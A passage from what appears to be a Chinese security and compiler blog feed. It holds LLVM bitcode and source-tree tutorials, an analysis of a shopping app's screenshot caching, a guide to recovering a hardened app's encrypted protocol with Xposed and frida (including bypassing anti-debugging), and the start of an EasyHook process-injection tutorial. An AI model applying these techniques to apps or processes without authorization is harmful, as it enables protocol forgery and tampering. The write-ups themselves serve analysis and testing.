class="meta-string">&lt;llvm-c/BitWriter.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>现在我们开始我们主要实现的功能，假设使用2个命令行参数，第一个是输入文件，第二个是输出文件。如果一个接收到以‘-’为文件名的参数，这意味着从标准输入读取或向标准输出写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">3</span> != argc)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Invalid command line!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> inputFilename = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> outputFilename = argv[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>所以首先我们扫描输入文件。我们将从其他输入或一个文件名得到一个LLVM内存缓冲对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LLVMMemoryBufferRef memoryBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if we are to read our input file from stdin</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="string">'-'</span> == inputFilename[<span class="number">0</span>]) &amp;&amp; (<span class="string">'\0'</span> == inputFilename[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">char</span> *message;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMCreateMemoryBufferWithSTDIN(&amp;memoryBuffer, &amp;message)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, message);</span><br><span class="line">    <span class="built_in">free</span>(message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">char</span> *message;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMCreateMemoryBufferWithContentsOfFile(</span><br><span class="line">               inputFilename, &amp;memoryBuffer, &amp;message)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, message);</span><br><span class="line">    <span class="built_in">free</span>(message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完这些代码后，memoryBuffer就可以读取我们的bitcode文件转为LLVM module。现在我们创建module</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// now create our module using the memory buffer</span></span><br><span class="line">LLVMModuleRef <span class="keyword">module</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != LLVMParseBitcode2(memoryBuffer, &amp;<span class="keyword">module</span>)) &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Invalid bitcode detected!\n"</span>);</span><br><span class="line">  LLVMDisposeMemoryBuffer(memoryBuffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// done with the memory buffer now, so dispose of it</span></span><br><span class="line">LLVMDisposeMemoryBuffer(memoryBuffer);</span><br></pre></td></tr></table></figure><p>一旦我们得到module，我们不再需要memory buffer了，我们直接释放这部分内存。我们设法获取了一个LLVM bitcode文件，将其反序列化为一个LLVM module，之后就可以随你操作了。因此假设你已经使用LLVM module完成了所有操作了，并希望写回bitcode文件.</p><p>方法和读取方法正交，我们寻找特殊文件名‘-’做相应处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check if we are to write our output file to stdout</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="string">'-'</span> == outputFilename[<span class="number">0</span>]) &amp;&amp; (<span class="string">'\0'</span> == outputFilename[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMWriteBitcodeToFD(<span class="keyword">module</span>, STDOUT_FILENO, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to write bitcode to stdout!\n"</span>);</span><br><span class="line">    LLVMDisposeModule(<span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMWriteBitcodeToFile(<span class="keyword">module</span>, outputFilename)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to write bitcode to file!\n"</span>);</span><br><span class="line">    LLVMDisposeModule(<span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们需要对内存清理，删除module：<br><code>LLVMDisposeModule(module);</code></p><p>我们现在就可以扫描并输出一个LLVM bitcode文件。<br><a href="https://github.com/sheredom/llvm_bc_parsing_example" target="_blank" rel="noopener">GitHub Example</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;如何读写LLVM-bitcode&quot;&gt;&lt;a href=&quot;#如何读写LLVM-bitcode&quot; class=&quot;headerlink&quot; title=&quot;如何读写LLVM b
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>京东“盗图”事件分析</title>
    <link href="http://fancy-blogs.com/2019/02/27/jdanalysis/"/>
    <id>http://fancy-blogs.com/2019/02/27/jdanalysis/</id>
    <published>2019-02-27T02:41:40.000Z</published>
    <updated>2019-02-27T02:45:38.425Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="京东“盗图”事件分析"><a href="#京东“盗图”事件分析" class="headerlink" title="京东“盗图”事件分析"></a>京东“盗图”事件分析</h1><p>这里还是利用上次讲的trace来宏观分析函数调用流。</p><p>利用ddms的trace功能，记录用户截图时，“京东金融app”在后台执行的函数流：<br><img src="/2019/02/27/jdanalysis/15512338044303.jpg" alt="w500"></p><p>涉及函数和截图有关，尝试搜索“screenshot”：<br><img src="/2019/02/27/jdanalysis/15512338738873.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512338842904.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512338942294.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512339034349.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512339165953.jpg" alt="w500"></p><p>这里省略了一些方法，主要涉及两个类：GlobalShotListener和ScreenShotListenManager</p><p>先看ScreenShotListenManager：<br><img src="/2019/02/27/jdanalysis/15512339408059.jpg" alt="w600"><br>注册全局的媒体内容观察者。响应函数：</p><p><img src="/2019/02/27/jdanalysis/15512339976224.jpg" alt="w400"><br>打印了一些截图信息，交给监听类处理:</p><p><img src="/2019/02/27/jdanalysis/15512340746782.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512341339635.jpg" alt="w500"><br>设置的监听响应对象是GlobalShotListener的实例。</p><p>看一下GlobalShotListener：</p><p><img src="/2019/02/27/jdanalysis/15512341701005.jpg" alt="w400"><br>响应函数调用gainShotBusinessItemGet</p><p><img src="/2019/02/27/jdanalysis/15512341886179.jpg" alt="w500"></p><p><img src="/2019/02/27/jdanalysis/15512342068041.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342154699.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342219927.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342390445.jpg" alt="w600"></p><p><img src="/2019/02/27/jdanalysis/15512342910972.jpg" alt="w500"><br>generateKey是由图片信息组成的类似文件名的特征字符串。<br>根据特征字符串在缓存文件中检索指定文件。</p><p><img src="/2019/02/27/jdanalysis/15512342982748.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512343179085.jpg" alt="w600"><br><img src="/2019/02/27/jdanalysis/15512343262746.jpg" alt="w500"><br>这里就能看到缓存文件夹的创建和使用，即涉事文件夹“uil-image”。</p><p>以上是事件涉及的函数。总结一下流程：<br>应用全局监听媒体内容变化（截图事件），出现截图后，根据uri信息获取图片信息，拿到图片路径后，生成特征字符串再本地缓存图片，供其他功能调用，这里只看到图片预览功能，未发现任何网络相关操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;京东“盗图”事件分析&quot;&gt;&lt;a href=&quot;#京东“盗图”事件分析&quot; class=&quot;headerlink&quot; title=&quot;京东“盗图”事件分析&quot;&gt;&lt;/a&gt;京东“盗图”
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>纯黑盒（不脱壳）app测试</title>
    <link href="http://fancy-blogs.com/2019/02/25/blackhook/"/>
    <id>http://fancy-blogs.com/2019/02/25/blackhook/</id>
    <published>2019-02-25T06:04:40.000Z</published>
    <updated>2019-02-25T06:07:26.658Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="纯黑盒（不脱壳）app测试"><a href="#纯黑盒（不脱壳）app测试" class="headerlink" title="纯黑盒（不脱壳）app测试"></a>纯黑盒（不脱壳）app测试</h1><p>之前做一个项目，需要分析出协议是否可以被攻击者模拟利用，app使用了加固，协议进行了加密，在完全黑盒的情况下进行测试。</p><p>一般情况下我们分析协议，直接反编译apk，找请求发包代码，一层层往上找，或者利用url关键字搜索，很容易发现参数处理的代码，还原逻辑，比较简单的甚至可以直接复制代码就能模拟协议了。<br>但是在黑盒的情况下，想拿到代码不太现实。收费版加固的强度还是足够的，脱壳需要的精力太大，不脱壳又看不到实现代码，无法还原逻辑。所以这里就讲一下纯黑盒下的协议分析。</p><p>这里涉及的技术其实就是动态分析技术，不是动态调试哦，一般的壳都会带反调试功能的。<br>动态分析工具在不侵入应用代码的情况下，获取应用执行的函数和调用顺序。通过筛选函数信息，完成对应用实现逻辑的大体还原。</p><h2 id="Traceview-Xposed"><a href="#Traceview-Xposed" class="headerlink" title="Traceview+Xposed"></a>Traceview+Xposed</h2><p>traceview是ddms里的一个功能，android studio也集成了（AS里的Record有时会报失败的错误）。<br><img src="/2019/02/25/blackhook/15508004241993.jpg" alt=""><br><img src="/2019/02/25/blackhook/15508048574747.jpg" alt=""></p><p>结束时得到一个.trace文件，里面记录了大量的函数调用，这时候需要你的一点经验了，筛选过滤出目标函数，通过该函数的调用上下文来梳理逻辑。<br>项目里的应用会根据订单信息产生一个二维码，尝试搜索“QR”：<br><img src="/2019/02/25/blackhook/15508051556815.jpg" alt="a-w600"><br>运气不错，存在调用createQRImage函数，该函数会由字符串参数指定生成二维码。利用Xposed hook得到一个加密的字符串，猜测是订单信息加密之后得到的。<br>这里说一下，hook方法和工具很多，用frida简单快速，不过对于加固应用，具有反调试，不能直接hook（直接hook是frida的进程ptrace到目标进程，会被kill），frida提供-f选项来让frida产生一个目标进程（这里对某叠词加固的双进程保护有效）。</p><p>想办法得到加密相关信息，一般写加密会用到的两个包，javax.crypto.~和(com.android.)org.bouncycastle那个包，那么搜索相关关键字就行。</p><p><img src="/2019/02/25/blackhook/15508255565094.jpg" alt="b-w600"><br><img src="/2019/02/25/blackhook/15508255648698.jpg" alt="c-w600"></p><p>实际中需要观察涉及到的函数名，有些是自写函数，会直接返回明文、IV、密钥等信息，这些函数hook起来很方便，也不用筛选log，因为自写函数基本都是在业务中的调用。</p><p>从客户那里了解到，请求的包体加密前还要做一下签名，一般做参数签名用到的md5、sha1、sha256这些，也很好hook：<br><img src="/2019/02/25/blackhook/15508259002282.jpg" alt="d-w600"></p><p>ok，拿到对协议参数做处理的函数后，就需要hook来验证，xposed写hook没什么特别的操作（找一个支持加固应用的demo就行，也就是支持multidex）。</p><p><img src="/2019/02/25/blackhook/15508261077649.jpg" alt="e-w600"></p><p><img src="/2019/02/25/blackhook/15508261396429.jpg" alt="f-w300"></p><p>一般知道加密函数、加密模式、密钥、IV后就能模拟应用发包请求了，大部分的应用协议加密类就一个，密钥什么的也都通用，甚至有些本地文件加密也和协议用的是同一个加密类。</p><p>这里推荐一篇<a href="https://la0s.github.io/2018/06/28/Toos2/" target="_blank" rel="noopener">博客</a>，介绍了我用到的工具，也让我知道了还有下面要讲的自动化的工具。</p><h3 id="Inspeckage"><a href="#Inspeckage" class="headerlink" title="Inspeckage"></a>Inspeckage</h3><p><a href="https://repo.xposed.info/module/mobi.acpm.inspeckage" target="_blank" rel="noopener">下载地址</a></p><p>安装之后，选择要分析的应用，点击“Launch APP”即可：</p><p><img src="/2019/02/25/blackhook/15508266726004.jpg" alt="g-w400"></p><p>本地转发8008端口，就可以打开提供的web视图：</p><p>加密类记录：<br><img src="/2019/02/25/blackhook/15508267996596.jpg" alt="h-w600"></p><p>哈希类记录：<br><img src="/2019/02/25/blackhook/15508269689635.jpg" alt="i-w600"></p><p>自动化的动态分析工具还是很方便的，由于它记录的函数是库中的函数，如果应用中涉及的加密自写了函数，就需要手动hook了，所以两种方法结合着用吧。<br>这里遇到的问题是端口老是掉，需要重新开启端口。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;纯黑盒（不脱壳）app测试&quot;&gt;&lt;a href=&quot;#纯黑盒（不脱壳）app测试&quot; class=&quot;headerlink&quot; title=&quot;纯黑盒（不脱壳）app测试&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LLVM源代码指南</title>
    <link href="http://fancy-blogs.com/2018/12/04/llvmguide-1/"/>
    <id>http://fancy-blogs.com/2018/12/04/llvmguide-1/</id>
    <published>2018-12-04T01:36:39.305Z</published>
    <updated>2018-12-04T10:00:08.882Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="LLVM源代码指南"><a href="#LLVM源代码指南" class="headerlink" title="LLVM源代码指南"></a>LLVM源代码指南</h1><ul><li>LLVM内核不包括前端，只是“中端”优化器，一堆后端，文档，还有大量辅助代码。像Clang这样的前端被放在单独的项目中。</li><li>核心的LLVM表现在RAM中，并使用大量C++ API进行操作。这种表现方式是可以转储到可读文本并解析回内存，但这只是为了方便调试：在使用LLVM的正常编译期间，永远不会生成文本形式的IR。通常，前端通过调用LLVM API来构建IR，然后运行一些优化PASS，最后调用后端来生成汇编或机器代码。当LLVM代码被存储在磁盘上时（在使用Clang正常编译C/C++时甚至都不会存在这种情况），是以“bitcode”形式存放，是一种紧凑的二进程表示。</li><li>主要的LLVM API文档由doxygen生成，可以在<a href="http://llvm.org/doxygen/index.html" target="_blank" rel="noopener">这里</a>找到。除非您已经知道自己在做什么以及在寻找什么（带有目的性的找和看），否侧这些信息很难被利用。以下链接是开始学习LLVM API的教程。</li></ul><p>代码<a href="https://github.com/llvm-mirror/llvm/tree/release_39" target="_blank" rel="noopener">根目录</a>，包含以下：</p><ol><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/bindings" target="_blank" rel="noopener">bindings</a>允许从C++以外的编程语言使用LLVM API。存在比这更多的bindings，包括C（我们将稍后介绍）和Haskell（<a href="https://hackage.haskell.org/package/llvm-general" target="_blank" rel="noopener">目录之外</a>）。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/cmake" target="_blank" rel="noopener">cmake</a>:LLVM现在使用CMake而不是autoconf。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/docs" target="_blank" rel="noopener">docs</a>ReStructuredText格式。请参阅<a href="https://github.com/llvm-mirror/llvm/blob/release_39/docs/LangRef.rst" target="_blank" rel="noopener">语言参考手册</a>，它定义了每个LLVM指令的含义。<a href="https://github.com/llvm-mirror/llvm/tree/release_39/docs/tutorial" target="_blank" rel="noopener">tutorial</a>子目录中的素材特别有趣，但不要在那里看，而是去<a href="http://llvm.org/docs/tutorial/" target="_blank" rel="noopener">这里</a>。这是学习LLVM最好的方式。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/examples" target="_blank" rel="noopener">examples</a>:这是教程配套的源代码。作为LLVM hacker，应该尽可能地从这里抠代码、CMakeLists.txt等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/include" target="_blank" rel="noopener">include</a>:第一个子目录<a href="https://github.com/llvm-mirror/llvm/tree/release_39/include/llvm-c" target="_blank" rel="noopener">llvm-c</a>包含了C的binding（作者曰：我从没使用过，但是看起来十分可靠）。重要的是，LLVM试图保持这些binding不变，而C++ API在不同版本中发生较大变化，尽管过去几年中变化的步伐已经放缓。第二个子目录<a href="https://github.com/llvm-mirror/llvm/tree/release_39/include/llvm" target="_blank" rel="noopener">llvm</a>是个大头：它包含878个头文件，用于定义所有LLVM API。一般来说，使用这些文件的doxygen版本而不是直接读取他们会更容易，但我经常最后使用这些文件来查找某些功能。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib" target="_blank" rel="noopener">lib</a>包含了真正的好东西，我们之后会单独看一下。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/projects" target="_blank" rel="noopener">projects</a>默认是不包含任何内容，但是可以在其中查看LLVM组件，例如compiler-rt（清理程序之类的运行时库），OpenMP support，以及位于单独repo中的LLVM C++库。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/resources" target="_blank" rel="noopener">resources</a>一些Visual C++的东西，并不关心（用于Windows二进制文件的版本资源定义）。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/runtimes" target="_blank" rel="noopener">runtimes</a>:外部项目的另一个占位符，在不久前加入。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/test" target="_blank" rel="noopener">test</a>:它也是一个大头，它包含了数以千计的LLVM单元测试，它们在构建检查目标时运行。其中大多数是包含LLVM IR文本版本的.ll文件。会测试比如说，一个优化pass是否能得到预期结果。我将在即将发布的博客中详细介绍LLVM的测试。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/tools" target="_blank" rel="noopener">tools</a>:LLVM本身只是一个库的集合，没有任何特定的主要功能。tools目录的大多数子目录都包含一个链接LLVM库的可执行工具。例如，llvm-dis是从bitcode到文本汇编格式的反汇编程序。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/unittests" target="_blank" rel="noopener">unittests</a>:更多单元测试，也是在检查构建目标时运行。这些是使用Google Test框架直接调用API的C++文件，而不像“test”目录里的部分，通过运行汇编程序，反汇编程序或优化程序等内容来间接调用LLVM功能。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/utils" target="_blank" rel="noopener">utils</a>:用于LLVM编码约定的emacs和vim模式；一个Valgrind suppression文件，以Valgrind监视所有子进程的方式在运行make check时消除误报；支持单元测试的lit和FileCheck工具；还有很多其他随机的东西。</li></ol><p>以下是跳过的“lib”目录，它包含了所有的重要内容，现在看一下它的子目录：</p><ol><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Analysis" target="_blank" rel="noopener">Analysis</a>包含许多静态Analysis，可以在编译器教科书中阅读这些Analysis，例如别名分析和全局值编号。某些Analysis是基于LLVM pass，必须由pass manager运行。其他的是基于library，能够直接调用。Analysis中一个奇怪的成员是InstructionSimplify.cpp，这是一个转换器，而不是分析器；我相信有人可以发表评论来解释它在这里做了什么（见<a href="#comment-19005">评论</a>）。我将在后续帖子中深入研究这个目录。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/AsmParser" target="_blank" rel="noopener">AsmParser</a>:将文本IR解析道内存中。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Bitcode" target="_blank" rel="noopener">Bitcode</a>:将IR序列化为紧凑格式并将其读回RAM。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/CodeGen" target="_blank" rel="noopener">CodeGen</a>:LLVM目标无关的代码生成器，基本上是LLVM后端适配的一个框架，也是后端可以使用的一堆库函数。这里有太多太多东西了（&gt;100 KLOC）不幸作者也不完全了解。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/DebugInfo" target="_blank" rel="noopener">DebugInfo</a>是一个用户维护LLVM指令和源代码位置之间映射的库。在2014年LLVM开发者大会的演讲中，这些<a href="http://llvm.org/devmtg/2014-10/Slides/Christopher-DebugInfoTutorial.pdf" target="_blank" rel="noopener">slides</a>中有很多有用的信息。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ExecutionEngine" target="_blank" rel="noopener">ExecutionEngine</a>:虽然LLVM通常被转换为汇编代码或机器码，但它可以使用解释器直接执行。作者最后一次使用它时，non-jitting解释器并不是十分有效，但是无论如何它比运行jitted代码慢地多。最新的<a href="http://llvm.org/devmtg/2016-11/#talk1" target="_blank" rel="noopener">JIT API</a>。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Fuzzer" target="_blank" rel="noopener">Fuzzer</a>:这是一个类似于<a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">AFL</a>的coverage-guided fuzzer。它不是fuzz LLVM组件，而是作为LLVM功能对由LLVM编译得到的程序进行模糊测试。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/IR" target="_blank" rel="noopener">IR</a>:一些与IR相关代码，没有其他明显的统一主题。有用于将IR转换为文本格式的代码，有用于升级由早期版本的LLVM创建的bitcode文件，有用于在创建IR节点时折叠常量等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/IRReader" target="_blank" rel="noopener">IRReader</a>, <a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LibDriver" target="_blank" rel="noopener">LibDriver</a>, <a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LineEditor" target="_blank" rel="noopener">LineEditor</a>:nobody care about these.</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Linker" target="_blank" rel="noopener">Linker</a>:一个LLVM模块（就像C/C++的编译单元），包含函数和变量。LLVM Linker将多个模块组合到一个更大的模块中。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LTO" target="_blank" rel="noopener">LTO</a>:链接时优化（许多博客文章和博士论文的主题）允许汇编优化联系独立编译所创建的边界。LLVM可以无花销地进行链接时优化，链接器创建一个大模块，然后使用常规优化PASS来优化。这曾经是首选的方法，但它不能扩展到大型项目。目前采用的方法是<a href="http://blog.llvm.org/2016/06/thinlto-scalable-and-incremental-lto.html" target="_blank" rel="noopener">ThinLTO</a>，它以很小的代价获得很大的效益。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/MC" target="_blank" rel="noopener">MC</a>:编译器通常发出汇编代码，让汇编程序处理创建机器代码。LLVM中的<a href="http://blog.llvm.org/2010/04/intro-to-llvm-mc-project.html" target="_blank" rel="noopener">MC子系统</a>切断了中间过程并直接生成机器代码。这可以加快编译速度，在LLVM用作JIT编译器时尤其有用。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Object" target="_blank" rel="noopener">Object</a>:处理目标文件格式的详细信息，例如ELF。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ObjectYAML" target="_blank" rel="noopener">ObjectYAML</a>:ObjectYAML似乎支持将对象文件编码为<a href="http://llvm.org/docs/YamlIO.html" target="_blank" rel="noopener">YAML</a>。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Option" target="_blank" rel="noopener">Option</a>:命令行解析。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Passes" target="_blank" rel="noopener">Passes</a>:PASS管理器的一部分，它调度和排序LLVM PASS，将其依赖关系和无效性考虑在内。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ProfileData" target="_blank" rel="noopener">ProfileData</a>:读取和写入配置文件数据以支持配置文件引导的优化。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Support" target="_blank" rel="noopener">Support</a>:其他支持代码包括APInts（在LLVM中普遍使用的任意精度整数）等等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/TableGen" target="_blank" rel="noopener">TableGen</a>:一种<a href="http://llvm.org/docs/TableGen/" target="_blank" rel="noopener">工具</a>（作者称其为古怪的瑞士军刀），它输入.td文件（其中LLVM中有200多个）包含结构化数据，并使用特定于域的后端发出由LLVM编译的C++代码。例如，TableGen被用来提取一些实现汇编器和反汇编器中单调的东西。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Target" target="_blank" rel="noopener">Target</a>:这里有后端中指定特定处理器的部分。有很多TableGen文件。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Transforms" target="_blank" rel="noopener">Transforms</a>:这是我最喜欢的目录，它是中端优化器所在的地方。IPO包含跨越函数边界的过程间优化，它们通常不会过于激进，因为它们必须查看大量代码。InstCombine是LLVM的窥视优化器的野兽。Instrumentation支持sanitizers。ObjCARC支持这一点。Scalar包含一堆教科书式的编译器各种优化器，我会尝试在某个时候写一篇关于这个目录内容的更详细的帖子。Utils是帮助代码。Vectorize是LLVM的自动矢量化器，近年来已成为许多工作的主题。</li></ol><p><span id="comment-19005">它不会改变IR本身。llvm::SumplifyInstruction的规则是它只能返回程序中的常量或现有值，这符合Analysis的要求。在每条指令上调用SimplifyInstruction的PASS是lib/Transforms/Utils/SimplifyInstructions.cpp里的转换器PASS。</span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;LLVM源代码指南&quot;&gt;&lt;a href=&quot;#LLVM源代码指南&quot; class=&quot;headerlink&quot; title=&quot;LLVM源代码指南&quot;&gt;&lt;/a&gt;LLVM源代码指南
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FileMonitorHook例子(translate)</title>
    <link href="http://fancy-blogs.com/2018/09/01/EasyHook/"/>
    <id>http://fancy-blogs.com/2018/09/01/EasyHook/</id>
    <published>2018-09-01T08:35:29.832Z</published>
    <updated>2018-09-04T06:15:37.852Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="EasyHook-FileMonitorHook"><a href="#EasyHook-FileMonitorHook" class="headerlink" title="EasyHook-FileMonitorHook"></a>EasyHook-FileMonitorHook</h1><h3 id="创建远程文件监视器"><a href="#创建远程文件监视器" class="headerlink" title="创建远程文件监视器"></a>创建远程文件监视器</h3><p>在本教程中，我们将使用EasyHook创建一个远程文件监视器。<br>我们将介绍如何：<br>根据进程ID将托管程序集注入现有目标进程,使用可执行文件路径将托管程序集注入新创建（并暂停）的进程<br>在远程进程中创建本地挂钩以监视3个文件操作（CreateFile，ReadFile和WriteFile）,使用.NET进程间通信（IPC）将报告文件访问回主控制台应用程序.</p><p>在本教程中，我们将创建一个包含两个项目的解决方案：<br>FileMonitor：一个C＃控制台应用程序;<br>FileMonitorHook：包含钩子逻辑和IPC接口的C＃类库。该组件是我们的注入payload。</p><h3 id="Remote-hooking-概述"><a href="#Remote-hooking-概述" class="headerlink" title="Remote hooking 概述"></a>Remote hooking 概述</h3><p>远程hook通常先用“injector”向目标进程注入一个payload，利用这个payload再安装我们的钩子。<br>由此，EasyHook库提供了“EasyHook.RemoteHooking”静态类和“EasyHook.IEntryPoint”接口。</p><ol><li>EasyHook.RemoteHooking.Inject:<br> 向指定的进程注入特定的32位/64位payload指令集，提供的参数将被传递给被注入的库。</li><li>EasyHook.RemoteHooking.CreateAndInject:<br> 从提供的可执行路径和命令行以挂起状态创建一个新进程，然后以“Inject”方式注入一个特定的32位/64位payload。</li><li>EasyHook.RemoteHooking.WakeUpProcess:<br> 与payload/注入库中的CreateAndInject结合使用，以在准备就绪时唤醒进程。</li><li>EasyHook.RemoteHooking.IpcCreateServer<t>:<br> 一个用来初始化injector和host的IPC通道的辅助方法。</t></li><li>EasyHook.RemoteHooking.IpcConnectClient<t>:<br> 一个用来在注入完成后将客户端连接至IPC通道的辅助方法。（被运行在目标进程中的注入的dll所调用）</t></li><li>EasyHook.IEntryPoint:<br> 